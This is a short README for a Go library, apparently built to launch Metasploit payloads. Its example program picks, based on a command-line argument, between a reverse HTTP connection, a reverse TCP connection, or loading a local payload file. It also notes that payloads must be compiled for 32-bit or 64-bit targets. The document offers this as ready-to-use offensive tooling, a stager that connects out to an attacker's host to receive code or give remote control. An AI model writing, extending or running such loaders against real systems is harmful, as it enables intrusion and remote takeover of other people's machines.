# msflib
A golang library designed to interact with Metasploit

Note: 32-bit and 64 bit payloads need to be compiled with corresponding compiling options.
For example, 32-bit payloads need to be compiled into 32-bit payloads

Example:
```
package main

import (
	"msflib"
	"os"
	"strings"
)

func main() {
	// check args
	if len(os.Args) < 2 {
		os.Exit(0)
	}

	switch {
	case strings.HasPrefix(os.Args[1], "http"):
		msflib.ReverseHTTP(os.Args[1])
	case strings.HasPrefix(os.Args[1], "tcp"):
		msflib.ReverseTCP(os.Args[1])
	default:
		msflib.LoadLocal(os.Args[1]) // assumes Arg[1] is a filename
	}
}

```
